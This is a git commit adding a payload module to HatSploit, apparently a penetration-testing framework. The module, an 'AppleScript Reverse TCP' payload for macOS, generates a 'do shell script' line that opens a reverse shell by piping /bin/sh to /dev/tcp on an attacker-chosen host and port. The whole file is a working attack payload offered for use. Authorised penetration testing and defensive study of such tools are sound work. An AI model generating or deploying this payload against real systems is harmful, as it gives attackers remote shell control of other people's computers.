9dbffe8bbefedb9a55ac74f090083181c7dfc25a
Ivan Nikolsky <enty8080@gmail.com>
2021-06-25 22:07:13 +0200

    Create applescript_trigger.py

---
+++ hatsploit/payloads/macos/generic/applescript_trigger.py
@@ -0,0 +1,51 @@
+#!/usr/bin/env python3
+
+#
+# This payload requires HatSploit: https://hatsploit.netlify.app
+# Current source: https://github.com/EntySec/HatSploit
+#
+
+from hatsploit.lib.payload import Payload
+from hatsploit.utils.tcp import TCPClient
+
+
+class HatSploitPayload(Payload, TCPClient):
+    details = {
+        'Category': "single",
+        'Name': "AppleScript Reverse TCP",
+        'Payload': "unix/generic/applescript_reverse_tcp",
+        'Authors': [
+            'Ivan Nikolsky (enty8080)'
+        ],
+        'Description': "AppleScript reverse TCP payload.",
+        'Comments': [
+            ''
+        ],
+        'Architecture': "generic",
+        'Platform': "macos",
+        'Risk': "high",
+        'Type': "reverse_tcp"
+    }
+
+    options = {
+        'LHOST': {
+            'Description': "Local host.",
+            'Value': TCPClient.get_local_host(),
+            'Type': "ip",
+            'Required': True
+        },
+        'LPORT': {
+            'Description': "Local port.",
+            'Value': 8888,
+            'Type': "port",
+            'Required': True
+        }
+    }
+
+    def run(self):
+        local_host, local_port = self.parse_options(self.options)
+
+        self.output_process("Generating payload...")
+        payload = f"do shell script \"/bin/sh &>/dev/tcp/{local_host}/{local_port} 0>&1 &\""
+
+        return payload
